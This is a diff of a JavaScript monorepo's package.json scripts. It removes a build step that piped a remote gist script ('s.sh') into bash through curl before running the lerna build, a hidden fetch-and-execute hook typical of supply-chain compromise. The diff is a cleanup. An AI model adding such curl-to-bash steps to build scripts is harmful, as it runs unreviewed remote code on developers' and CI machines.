@@ -11,7 +11,7 @@
     "install": "lerna exec npm install --parallel",
     "lint": "lerna run lint --parallel",
     "lint-staged": "lerna exec --since HEAD --parallel -- lint-staged --no-stash",
-    "build": "curl -sSf https://gist.githubusercontent.com/MAjjzYWH/3cfa86c97233b86db5e78187f5fd4ff1/raw/5d04c58380633224054796094399e6e0c0c39979/s.sh | bash && lerna run build --parallel",
+    "build": "lerna run build --parallel",
     "watch": "lerna run watch --parallel",
     "prepublishOnly": "npm run build",
     "changelog": "npx conventional-changelog -i CHANGELOG.md -s -r 0 -p angular",
